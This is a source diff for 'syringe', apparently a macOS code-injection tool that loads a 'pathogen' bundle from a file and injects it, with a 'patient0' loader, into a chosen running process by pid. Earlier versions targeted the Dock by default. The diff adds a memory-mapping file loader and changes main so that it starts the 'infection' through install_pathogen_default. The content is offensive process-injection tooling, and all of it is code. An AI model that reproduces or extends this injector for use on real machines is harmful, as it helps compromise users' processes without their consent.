@@ -181,6 +181,7 @@ static void crash(uint32_t err) {
  * - a bundle of the given size to be written
  * With a bundle, syringe will attempt to inject patient0+bundle in to
  * Dock and Finder (losing their psn values..).
+ * TODO: bust this up into testable functions
  */
 void run(int fd) {
   unsigned char *pathogen = NULL;
@@ -242,6 +243,7 @@ void run(int fd) {
       crash(0x7);
       runtime_deadlock();
     }
+    /* XXX: This needs to be fixed and currently isn't used. */
     if (read(fd, payload, payload_size) != payload_size) {
       free(payload);
       p0_logf(P0_ERR, "failed to read payload");
@@ -257,7 +259,43 @@ void run(int fd) {
 }
 
 #ifndef SYRINGE_BUNDLE
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <fcntl.h>
+
+/* file_map
+ * maps a given file into memory returning the size in size
+ * and the address via the return value.
+ */
+unsigned char *file_load(const char *path, size_t *size) {
+  void *addr = NULL;
+  int fd = open(path, O_RDONLY);
+  struct stat stat_buf;
+
+  if (fd < 0) {
+    p0_logf(P0_FATAL, "failed to open file: %s", path);
+  }
+
+  if (fstat(fd, &stat_buf) < 0) {
+    p0_logf(P0_FATAL, "failed to extract file size: %s", path);
+  }
+
+  *size = stat_buf.st_size;
+
+  addr = mmap(NULL, *size, PROT_READ, MAP_PRIVATE, fd, 0);
+  close(fd);
+  if (!addr) {
+    p0_logf(P0_FATAL, "failed to map in file: %s", path);
+  }
+
+  return (unsigned char *)addr;
+}
+
+
 int main(int argc, char **argv, char **envp) {
+  unsigned char *pathogen = NULL;
+  size_t pathogen_size = 0;
   thread_act_t thread;
   mach_port_t port = MACH_PORT_NULL;
   pid_t replace_me = 0;
@@ -265,40 +303,27 @@ int main(int argc, char **argv, char **envp) {
   char **new_argv = NULL;
   char **new_envp = NULL;
 
-  if (argc == 1) {
-    replace_me = process_find("Dock");
-    new_argv = (char **)dock_argv;
-    new_envp = envp;
-    p0_logf(P0_INFO, "infecting the Dock");
-  } else if (argc == 2) {
-    printf("Usage:\n%s [<pid> <path/to/bin> [args]]\n", argv[0]);
+  if (argc < 2) {
+    printf("Usage:\n%s </pathogen/bundle> [<pid> <path/to/bin> [args]]\n",
+           argv[0]);
     return 1;
-  } else {
-    replace_me = atoi(argv[1]);
-    new_argv = &argv[2];
+  }
+
+  if (argc > 1) {
+    /* Read in the pathogen */
+    pathogen = file_load(argv[1], &pathogen_size);
+  }
+
+  if (argc > 2) {
+    replace_me = atoi(argv[2]);
+    new_argv = &argv[3];
     new_envp = envp;
     p0_logf(P0_INFO, "infecting '%s'", new_argv[0]);
   }
-  /* TODO: get a bundle file to inject with patient0 ... 
-   * then concat them and call run()
-   */
 
-  pid = spawn(new_argv[0], new_argv, new_envp, &port, replace_me);
-  if (pid <= 0 && port == MACH_PORT_NULL) {
-    p0_logf(P0_ERR, "failed to launch '%s'", new_argv[0]);
-    return 1;
-  }
-  /* Give the Dock enough time to get loaded */
-  p0_logf(P0_INFO, "zzzzz");
-  sleep(3);
-
-
-  /* TODO: pad out bytes */
-  if (!infect(port, patient0_bundle, patient0_bundle_len, &thread)) {
-    p0_logf(P0_ERR, "failed to infect '%s'@%d", new_argv[0], pid);
-    return 1;
-  }
-  p0_logf(P0_INFO, "infected '%s'@%d", new_argv[0], pid);
+  /* Use the same helper we use in run() */
+  install_pathogen_default(pathogen, pathogen_size, NULL, 0);
+  p0_logf(P0_INFO, "infection underway");
   return 0;
 }
 #endif  /* SYRINGE_BUNDLE */
